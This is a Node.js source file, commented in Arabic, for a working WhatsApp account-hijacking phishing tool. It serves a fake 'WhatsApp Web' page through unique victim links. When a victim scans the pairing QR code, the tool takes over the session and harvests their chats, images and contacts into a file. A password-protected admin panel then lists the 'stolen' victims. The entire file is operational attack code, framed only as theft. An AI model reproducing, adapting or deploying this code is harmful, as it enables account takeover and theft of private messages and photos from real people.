const express = require('express');
const qrcode = require('qrcode');
const { Client, LocalAuth } = require('whatsapp-web.js');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3000;

let qrCodeData = null;
let clients = {};
let victimsData = {};

// قراءة البيانات المخزنة مسبقاً (عند إعادة تشغيل الخادم)
if (fs.existsSync('victims.json')) {
    victimsData = JSON.parse(fs.readFileSync('victims.json', 'utf8'));
}

// حفظ البيانات فوراً عند التحديث
function saveVictimsData() {
    fs.writeFileSync('victims.json', JSON.stringify(victimsData, null, 2));
}

// إنشاء عميل واتساب جديد لكل ضحية
function createClient(sessionId) {
    if (clients[sessionId]) return clients[sessionId];
    
    const client = new Client({
        authStrategy: new LocalAuth({ clientId: sessionId }),
        puppeteer: {
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        }
    });
    
    client.on('qr', (qr) => {
        qrcode.toDataURL(qr, (err, url) => {
            if (!err) {
                victimsData[sessionId] = victimsData[sessionId] || { qr: url, status: 'waiting', data: {} };
                victimsData[sessionId].qr = url;
                saveVictimsData();
            }
        });
    });
    
    client.on('ready', async () => {
        console.log(`✅ Session ${sessionId} hacked`);
        victimsData[sessionId].status = 'hacked';
        saveVictimsData();
        
        // سرقة البيانات
        setTimeout(async () => {
            try {
                const chats = await client.getChats();
                let allMessages = [];
                let allImages = [];
                
                for (const chat of chats) {
                    const messages = await chat.fetchMessages({ limit: 100 });
                    for (const msg of messages) {
                        allMessages.push({
                            from: msg.from,
                            body: msg.body || '',
                            timestamp: msg.timestamp,
                            hasMedia: msg.hasMedia
                        });
                        
                        // تحميل الصور إذا وجدت
                        if (msg.hasMedia && msg.type === 'image') {
                            const media = await msg.downloadMedia();
                            allImages.push({
                                from: msg.from,
                                data: media.data,
                                mimetype: media.mimetype,
                                timestamp: msg.timestamp
                            });
                        }
                    }
                }
                
                victimsData[sessionId].data = {
                    name: client.info.pushname || 'Unknown',
                    number: client.info.wid.user,
                    messages: allMessages,
                    images: allImages,
                    contacts: chats.map(c => ({ name: c.name, number: c.id.user })),
                    timestamp: new Date().toISOString()
                };
                saveVictimsData();
                console.log(`✅ Stolen data for ${sessionId}: ${allMessages.length} messages, ${allImages.length} images`);
            } catch(err) {
                console.error(err);
            }
        }, 5000);
    });
    
    client.initialize();
    clients[sessionId] = client;
    return client;
}

// صفحة QR لكل ضحية (رابط فريد)
app.get('/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    if (!victimsData[sessionId]) {
        victimsData[sessionId] = { status: 'new' };
        createClient(sessionId);
    }
    const qr = victimsData[sessionId].qr || '';
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>WhatsApp Web</title>
            <style>
                body { background: #075e54; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .container { background: white; padding: 30px; border-radius: 20px; text-align: center; max-width: 400px; }
                img { width: 220px; margin: 20px; }
                h2 { color: #075e54; }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>WhatsApp Web</h2>
                <p>امسح الرمز لتسجيل الدخول</p>
                <img src="${qr}">
                <p>افتح واتساب ← القائمة ← WhatsApp Web</p>
                <button onclick="location.reload()">تحديث</button>
            </div>
        </body>
        </html>
    `);
});

// لوحة التحكم الرئيسية (الزر الشفاف)
app.get('/admin', (req, res) => {
    const pass = req.query.pass;
    if (pass !== '2011') {
        return res.send('كلمة سر غير صحيحة');
    }
    
    let victimsList = Object.keys(victimsData)
        .filter(id => victimsData[id].status === 'hacked' && victimsData[id].data)
        .map(id => ({
            id: id,
            name: victimsData[id].data.name,
            number: victimsData[id].data.number,
            msgCount: victimsData[id].data.messages.length,
            imgCount: victimsData[id].data.images.length
        }));
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>لوحة التحكم - البيانات المسروقة</title>
            <style>
                body { background: #0a0a0a; font-family: monospace; color: #0f0; padding: 20px; }
                h1 { color: #ff4444; }
                .victim { background: #111; margin: 10px; padding: 15px; border-radius: 10px; cursor: pointer; }
                .victim:hover { background: #222; }
                .details { display: none; margin-top: 10px; border-top: 1px solid #0f0; padding-top: 10px; }
                .details img { max-width: 100px; margin: 5px; }
                pre { white-space: pre-wrap; font-size: 12px; }
            </style>
        </head>
        <body>
            <h1>📱 الضحايا المسروقون</h1>
            ${victimsList.map(v => `
                <div class="victim" onclick="toggleDetails('${v.id}')">
                    <b>👤 ${v.name}</b> | 📞 ${v.number} | 📨 ${v.msgCount} رسالة | 🖼️ ${v.imgCount} صورة
                    <div id="details-${v.id}" class="details"></div>
                </div>
            `).join('')}
            <script>
                const victimsData = ${JSON.stringify(victimsData)};
                function toggleDetails(id) {
                    const div = document.getElementById('details-' + id);
                    if (div.innerHTML) {
                        div.innerHTML = '';
                        div.style.display = 'none';
                        return;
                    }
                    const data = victimsData[id].data;
                    let html = '<h3>📨 الرسائل</h3><pre>';
                    data.messages.forEach(msg => {
                        html += \`[\${new Date(msg.timestamp * 1000).toLocaleString()}] \${msg.from}: \${msg.body}\\n\`;
                    });
                    html += '</pre><h3>🖼️ الصور</h3>';
                    data.images.forEach(img => {
                        html += \`<img src="data:\${img.mimetype};base64,\${img.data}">\`;
                    });
                    div.innerHTML = html;
                    div.style.display = 'block';
                }
            </script>
        </body>
        </html>
    `);
});

// الصفحة الرئيسية (توليد روابط فريدة)
app.get('/', (req, res) => {
    const sessionId = 'victim_' + Date.now();
    res.redirect(`/${sessionId}`);
});

app.listen(port, () => {
    console.log(`✅ Server: http://localhost:${port}`);
    console.log(`✅ Admin: http://localhost:${port}/admin?pass=2011`);
});